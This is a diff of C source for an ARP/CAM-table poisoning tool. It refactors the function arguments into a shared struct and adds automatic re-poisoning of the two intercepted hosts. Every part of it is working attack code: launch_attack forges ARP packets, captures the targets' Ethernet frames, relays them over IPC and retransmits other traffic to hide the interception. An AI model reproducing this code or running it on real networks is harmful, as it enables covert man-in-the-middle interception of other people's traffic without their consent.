@@ -120,34 +120,28 @@ int static inline queue_message(struct queue *q, void *buf, size_t buflen) {
 }
 
 // Some inline function (for speed) which compose launch_attack()
-int static inline poison_mac(int sock, struct iface *iface,
-		uint8_t mac[ETH_ALEN]) {
+int static inline poison_mac(struct poison_info *info, uint8_t mac[ETH_ALEN]) {
 	struct arp_pkt req;
 
 	// create the poisoning arp request
-	if (!arp_poison(iface, mac, &req, sizeof(req))) {
+	if (!arp_poison(info->iface, mac, &req, sizeof(req))) {
 		log_error("Failed to craft an poisoning arp request\n");
 		return 0;
 	}
 	// send it
-	if (send(sock, &req, sizeof(req), 0) == -1) {
+	if (send(info->sock, &req, sizeof(req), 0) == -1) {
 		perror("Error while sending arp");
 		return 0;
 	}
 	return 1;
 }
 
-int static inline receive_messages(int epollfd, struct ipc *ipc,
-		struct iface *iface, struct queue *q, int duration,
-		uint8_t h1[ETH_ALEN], uint8_t h2[ETH_ALEN]) {
+int static inline receive_messages(int epollfd, struct poison_info *info,
+		int duration) {
 
-	// prepare the args structure for the callback
 	struct cb_args args;
-	args.queue = q;
-	args.h1 = h1;
-	args.h2 = h2;
-	args.local = iface->hwaddr;
-	args.ipc = ipc;
+	args.info = info;
+	args.extra = NULL;
 
 	// receive all messages for the duraction
 	switch (recvfrom_multiple_with_timeout(epollfd, duration,
@@ -164,8 +158,8 @@ int static inline receive_messages(int epollfd, struct ipc *ipc,
 }
 int receive_messages_callback(void *buf, ssize_t buflen,
 		struct sockaddr *addr, socklen_t addr_l, void *args) {
-	// cast args
-	struct cb_args *cb_args = args;
+
+	struct poison_info *info = ((struct cb_args *) args)->info;
 
 	if (addr->sa_family == AF_UNIX) {			// received from the IPC
 		// Consider the empty datagram as flush request
@@ -186,7 +180,7 @@ int receive_messages_callback(void *buf, ssize_t buflen,
 					eh->ether_dhost[4], eh->ether_dhost[5],
 					ntohs(eh->ether_type));
 
-			queue_message(cb_args->queue, buf, buflen);
+			queue_message(info->queue, buf, buflen);
 		}
 	} else if (addr->sa_family == AF_PACKET) {	// received from the network
 		// cast to ethernet frame
@@ -208,22 +202,29 @@ int receive_messages_callback(void *buf, ssize_t buflen,
 					eh->ether_dhost[4], eh->ether_dhost[5],
 					ntohs(eh->ether_type));
 
+			// Check the source address and re-poison if it comes from one of
+			// the intercepted hosts
+			if (ETHER_CMP(eh->ether_shost, info->h1) ||
+					ETHER_CMP(eh->ether_shost, info->h2)) {
+				poison_mac(info, eh->ether_shost);
+			}
+
 			// If the frame goes to one of the hosts, we send the frame
 			// through the IPC.
 			// If it goes to the local interface, we dont treat it
 			// Else we queue it for later retransmission
-			if (ETHER_CMP(eh->ether_dhost, cb_args->h1) ||
-					ETHER_CMP(eh->ether_dhost, cb_args->h2)) {
+			if (ETHER_CMP(eh->ether_dhost, info->h1) ||
+					ETHER_CMP(eh->ether_dhost, info->h2)) {
 				// send through IPC
-				if (sendto_ipc(cb_args->ipc, buf, buflen) == -1) {
+				if (sendto_ipc(info->ipc, buf, buflen) == -1) {
 					perror("Failed to send frame through IPC");
 				}
-			} else if (ETHER_CMP(eh->ether_dhost, cb_args->local)) {
+			} else if (ETHER_CMP(eh->ether_dhost, info->iface->hwaddr)) {
 				log_debug("Frame for the local interface discarded\n");
 			} else {
 				// other Ethernet frame => queue if its a unicast frame
 				if ((eh->ether_dhost[0] & 0x01) == 0x00) {
-					queue_message(cb_args->queue, buf, buflen);
+					queue_message(info->queue, buf, buflen);
 				} else {
 					log_debug("Multicast ethernet frame discarded\n");
 				}
@@ -236,8 +237,8 @@ int receive_messages_callback(void *buf, ssize_t buflen,
 /*
  * CAM table restoration
  */
-int static inline restore_mac_async(int sock,
-		struct iface *iface, uint8_t mac[ETH_ALEN]) {
+int static inline restore_mac_async(struct poison_info *info,
+		uint8_t mac[ETH_ALEN]) {
 	struct arp_pkt req;
 	struct in_addr *ip = arp_cache_search_ip(mac);
 
@@ -253,35 +254,34 @@ int static inline restore_mac_async(int sock,
 			mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 
 	// create the arp request to restore the CAM tables
-	if (!arp_request(iface, ip->s_addr, &req, sizeof(req))) {
+	if (!arp_request(info->iface, ip->s_addr, &req, sizeof(req))) {
 		log_error("Failed to craft an arp request to restore CAM tables\n");
 		return 0;
 	}
 	// send it
-	if (send(sock, &req, sizeof(req), 0) == -1) {
+	if (send(info->sock, &req, sizeof(req), 0) == -1) {
 		perror("Error while sending arp");
 		return 0;
 	}
 	return 1;
 }
 
-int static inline restore_mac(int sock, struct queue *q,
-		struct iface *iface, uint8_t mac[ETH_ALEN]) {
+int static inline restore_mac(struct poison_info *info,
+		uint8_t mac[ETH_ALEN]) {
 	int i;
 	struct arp_pkt req;
 	struct cb_args args;
-	args.ip = arp_cache_search_ip(mac);
-	args.queue = q;
+	struct in_addr *ip = arp_cache_search_ip(mac);
 
 	// check the MAC address is in the local ARP cache
-	if (args.ip == NULL) {
+	if (ip == NULL) {
 		log_error("%02x:%02x:%02x:%02x:%02x:%02x cannot be resolved to IP. "
 				"Skip it\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 		return 0;
 	}
 
 	// create the arp request to restore the CAM tables
-	if (!arp_request(iface, args.ip->s_addr, &req, sizeof(req))) {
+	if (!arp_request(info->iface, ip->s_addr, &req, sizeof(req))) {
 		log_error("Failed to craft an arp request to restore CAM tables\n");
 		return 0;
 	}
@@ -290,16 +290,20 @@ int static inline restore_mac(int sock, struct queue *q,
 			"%02x:%02x:%02x:%02x:%02x:%02x in CAM tables\n",
 			mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 
+	// initialize the callback arguments
+	args.info = info;
+	args.extra = ip;
+
 	// loop for several retries
 	for (i=0; i<ARP_RESTORE_MAX_RETRY; i++) {
 		log_debug("ARP Restoration: sending packet #%i\n", i+1);
-		if (send(sock, &req, sizeof(req), 0) == -1) {
+		if (send(info->sock, &req, sizeof(req), 0) == -1) {
 			perror("Error while sending ARP");
 			return 0;
 		}
 
 		// read response to locate the ARP reply
-		switch (recvfrom_with_timeout(sock, ARP_RESTORE_TIMEOUT,
+		switch (recvfrom_with_timeout(info->sock, ARP_RESTORE_TIMEOUT,
 					&restore_mac_callback, &args)) {
 			case -1:
 				// error
@@ -327,9 +331,9 @@ int static inline restore_mac(int sock, struct queue *q,
 int restore_mac_callback(void *buf, ssize_t buflen,
 		struct sockaddr *addr, socklen_t addr_l, void *args) {
 
-
 	// cast args
-	struct cb_args *cb_args = args;
+	struct poison_info *info = ((struct cb_args *) args)->info;
+	struct in_addr *ip = ((struct cb_args *) args)->extra;
 
 	// cast to arp packet
 	struct arp_pkt *res = (struct arp_pkt *)buf;
@@ -348,26 +352,25 @@ int restore_mac_callback(void *buf, ssize_t buflen,
 			if (res->ah.arp_hrd == htons(ARPHRD_ETHER) &&
 					res->ah.arp_pro == htons(ETHERTYPE_IP) &&
 					res->ah.arp_op == htons(ARPOP_REPLY) &&
-					ntohl(*(in_addr_t *)res->ah.arp_spa) ==
-					cb_args->ip->s_addr) {
+					ntohl(*(in_addr_t *)res->ah.arp_spa) == ip->s_addr) {
 				// it is the expected response => stop
 				log_debug("Received ARP reply which restored CAM tables\n");
 				return 1;
 			}
 		} else {
 			// other Ethernet frame => just queue it
-			queue_message(cb_args->queue, buf, buflen);
+			queue_message(info->queue, buf, buflen);
 		}
 	}
 	return 0;	// continue the recvfrom loop
 }
 
-int static inline retransmit_one(int sock, struct iface *iface,
+int static inline retransmit_one(struct poison_info *info,
 		struct message *msg) {
 	struct ether_header *eth = (struct ether_header *) msg->buf;
 
 	// Send the message
-	if (send(sock, eth, msg->len, 0) == -1) {
+	if (send(info->sock, eth, msg->len, 0) == -1) {
 		perror("Error while retransmitting the message");
 		return 0;
 	}
@@ -385,26 +388,29 @@ int static inline retransmit_one(int sock, struct iface *iface,
 	// A side effect of frame retransmission is that the sender's MAC
 	// address is poisoned in CAM tables too => force the restoration
 	// of this address (asynchronously because we don't really mind
-	// whether it successfully restore CAM tables)
-	restore_mac_async(sock, iface, eth->ether_shost);
+	// whether it successfully restores CAM tables). All MAC addresses should
+	// not be restored: intercepted hosts should not
+	if (!ETHER_CMP(eth->ether_shost, info->h1) &&
+			!ETHER_CMP(eth->ether_shost, info->h2)) {
+		restore_mac_async(info, eth->ether_shost);
+	}
 	return 1;	// success
 }
 
-int static inline retransmit_all(int sock, struct iface *iface,
-		struct queue *old_q, struct queue *new_q) {
+int static inline retransmit_all(struct poison_info *info,
+		struct queue *old_q) {
 	int i, j;
 	// iterate over each qlist of the old queue
 	for (i = 0; i < old_q->count; i++) {
 		if (old_q->entries[i].count > 0) {
 			// first restore MAC
-			if (!restore_mac(sock, new_q, iface, old_q->entries[i].dest)) {
+			if (!restore_mac(info, old_q->entries[i].dest)) {
 				log_error("Skip retransmission: packets will be lost\n");
 				continue;
 			}
 			// then retransmit all frames
 			for (j = 0; j < old_q->entries[i].count; j++) {
-				if (!retransmit_one(sock, iface,
-							&old_q->entries[i].messages[j])) {
+				if (!retransmit_one(info, &old_q->entries[i].messages[j])) {
 					log_warning("Could not retransmit one message\n");
 				}
 			}
@@ -414,16 +420,26 @@ int static inline retransmit_all(int sock, struct iface *iface,
 
 void launch_attack(struct iface *iface, struct ipc *ipc, int freq,
 		struct in_addr h1, struct in_addr h2) {
+	// initialize the poison_info structure
+	struct poison_info info;
+	memset(&info, 0, sizeof(struct poison_info));
+	info.iface = iface;
+	info.ipc = ipc;
+
 	// open the super socket for injection
 	int sock = super_socket(iface, SOCK_RAW, ETH_P_ALL);
+	info.sock = sock;
 
 	// create the message queue
 	struct queue current_q, old_q;
 	init_queue(&current_q);
+	info.queue = &current_q;
 
 	// resolve IP addresses to MAC addressess
 	uint8_t *h1_mac = arp_cache_search_mac(h1);
 	uint8_t *h2_mac = arp_cache_search_mac(h2);
+	info.h1 = h1_mac;
+	info.h2 = h2_mac;
 
 	// prepare the epoll structure to read both sock & ipc
 	struct epoll_event ev;
@@ -456,16 +472,13 @@ void launch_attack(struct iface *iface, struct ipc *ipc, int freq,
 	while (1) {
 		// poison both hosts' MAC addresses
 		log_debug("Launch poisoning ARP requests\n");
-		if (!poison_mac(sock, iface, h1_mac) ||
-				!poison_mac(sock, iface, h2_mac)) {
+		if (!poison_mac(&info, h1_mac) || !poison_mac(&info, h2_mac)) {
 			continue; // stop there on failure
 		}
 
 		// Read incoming messages for the given duration
 		log_debug("Read incoming frames\n");
-		if (!receive_messages(epollfd, ipc,
-					iface, &current_q, freq,
-					h1_mac, h2_mac)){
+		if (!receive_messages(epollfd, &info, freq)){
 			continue; // stop there on failure
 		}
 
@@ -475,7 +488,7 @@ void launch_attack(struct iface *iface, struct ipc *ipc, int freq,
 			log_debug("Retransmit queued frames\n");
 			memcpy(&old_q, &current_q, sizeof(old_q));
 			init_queue(&current_q);
-			if (!retransmit_all(sock, iface, &old_q, &current_q)) {
+			if (!retransmit_all(&info, &old_q)) {
 				free_queue(&old_q);
 				continue; // stop there on failure
 			}
